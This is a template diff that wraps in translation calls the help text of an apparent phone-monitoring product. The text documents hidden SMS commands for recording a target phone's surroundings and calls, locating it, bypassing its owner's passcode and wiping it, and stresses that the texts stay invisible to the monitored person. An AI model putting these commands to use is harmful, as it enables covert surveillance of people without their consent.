@@ -7,56 +7,56 @@
     <h1 class="text-center">{$title}</h1>
 
     <div>
-        <p>Have you ever been in a situation when you needed to get some info from target device or schedule something but you did not have time or simply Internet to do that from your Control Panel?</p>
-        <p>Introducing the SMS Commands feature. Send SMS command from Any cell phone to targeted phone via regular text. The text will not show up on the phone you are monitoring!  All commands should start with #!# symbols. Simple as that!</p>
+        <p>{$di.t->_('Have you ever been in a situation when you needed to get some info from target device or schedule something but you did not have time or simply Internet to do that from your Control Panel?')}</p>
+        <p>{$di.t->_('Introducing the SMS Commands feature. Send SMS command from Any cell phone to targeted phone via regular text. The text will not show up on the phone you are monitoring!  All commands should start with #!# symbols. Simple as that!')}</p>
 
         <div class="doc-block">
-            <h3>Record Surrounding</h3>
+            <h3>{$di.t->_('Record Surrounding')}</h3>
             <pre>#!# sur_rec mm-MM</pre>
-            <p>Schedule a surrounding recording for a specific time directly from your Cell phone remotely! It will be uploaded via Internet as soon as its recorded.</p>
-            <strong>Options:</strong>
+            <p>{$di.t->_('Schedule a surrounding recording for a specific time directly from your Cell phone remotely! It will be uploaded via Internet as soon as its recorded.')}</p>
+            <strong>{$di.t->_('Options:')}</strong>
             <ul>
-                <li><b>mm</b> - sets in how many minutes from now to start recording</li>
-                <li><b>MM</b> - sets in how many minutes from now to start recording</li>
+                <li><b>mm</b> - {$di.t->_('sets in how many minutes from now to start recording')}</li>
+                <li><b>MM</b> - {$di.t->_('sets in how many minutes from now to start recording')}</li>
             </ul>
         </div>
 
         <div class="doc-block">
-            <h3>Call Recording</h3>
+            <h3>{$di.t->_('Call Recording')}</h3>
             <pre>#!# rec_phone +xxxxxxxxxxxx</pre>
-            <p>Specify the number to be recorded remotely via Text!</p>
-            <strong>Options:</strong>
+            <p>{$di.t->_('Specify the number to be recorded remotely via Text!')}</p>
+            <strong>{$di.t->_('Options:')}</strong>
             <ul>
-                <li><b>+xxxxxxxxxxxx</b> - cell phone number to be recorded entered in international format</li>
+                <li><b>+xxxxxxxxxxxx</b> - {$di.t->_('cell phone number to be recorded entered in international format')}</li>
             </ul>
         </div>
 
         <div class="doc-block">
-            <h3>Lock Phone</h3>
+            <h3>{$di.t->_('Lock Phone')}</h3>
             <pre>#!# lock xxxx</pre>
-            <p>Set your passcode on the target phone. Lock the device to protect the sensitive info in case it is stolen or lost!</p>
-            <strong>Options:</strong>
+            <p>{$di.t->_('Set your passcode on the target phone. Lock the device to protect the sensitive info in case it is stolen or lost!')}</p>
+            <strong>{$di.t->_('Options:')}</strong>
             <ul>
-                <li><b>xxxx</b> - passcode, not less than 4 symbols</li>
+                <li><b>xxxx</b> - {$di.t->_('passcode, not less than 4 symbols')}</li>
             </ul>
         </div>
 
         <div class="doc-block">
-            <h3>Unlock Phone</h3>
+            <h3>{$di.t->_('Unlock Phone')}</h3>
             <pre>#!# unlock</pre>
-            <p>If the target phone owner put a passcode on the phone and you need to get rid of it - you can simply do that with the help of this SMS command!</p>
+            <p>{$di.t->_('If the target phone owner put a passcode on the phone and you need to get rid of it - you can simply do that with the help of this SMS command!')}</p>
         </div>
 
         <div class="doc-block">
-            <h3>Phone Location</h3>
+            <h3>{$di.t->_('Phone Location')}</h3>
             <pre>#!# location</pre>
-            <p>Need to know the exact where abouts and cannot access Control Panel to do that? Send this SMS command and get a text back with Location coordinates as well as link to Google maps to see it on the map!</p>
+            <p>{$di.t->_('Need to know the exact where abouts and cannot access Control Panel to do that? Send this SMS command and get a text back with Location coordinates as well as link to Google maps to see it on the map!')}</p>
         </div>
 
         <div class="doc-block">
-            <h3>Wipe Phone</h3>
+            <h3>{$di.t->_('Wipe Phone')}</h3>
             <pre>#!# wipe</pre>
-            <p>In case phone is lost, stolen or there is a necessity to do a factory reset remotely - use this SMS command!</p>
+            <p>{$di.t->_('In case phone is lost, stolen or there is a necessity to do a factory reset remotely - use this SMS command!')}</p>
         </div>
     </div>
 </div>
